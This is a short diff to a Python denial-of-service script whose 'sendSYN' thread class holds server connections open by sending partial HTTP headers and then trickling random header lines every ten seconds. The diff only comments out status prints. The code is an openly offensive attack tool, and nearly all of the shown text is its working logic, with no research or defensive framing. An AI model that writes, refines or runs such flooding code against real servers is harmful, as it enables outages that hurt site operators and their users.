@@ -131,8 +131,8 @@ class sendSYN(threading.Thread):
             s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
             s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
             #s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
-            print("\r%d threads running" % sendSYN.THREAD, end="")
-            print("\nsocket build successful!")
+            #print("\r%d threads running" % sendSYN.THREAD, end="")
+            #print("\nsocket build successful!")
         except KeyboardInterrupt:
             print("\nSYN flood attack ends!")
             exit(0)
@@ -141,7 +141,7 @@ class sendSYN(threading.Thread):
             return
         while True:
             try:
-                print("send a pair")
+                #print("send a pair")
                 s.send("H-s: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                 time.sleep(10)
             except KeyboardInterrupt:
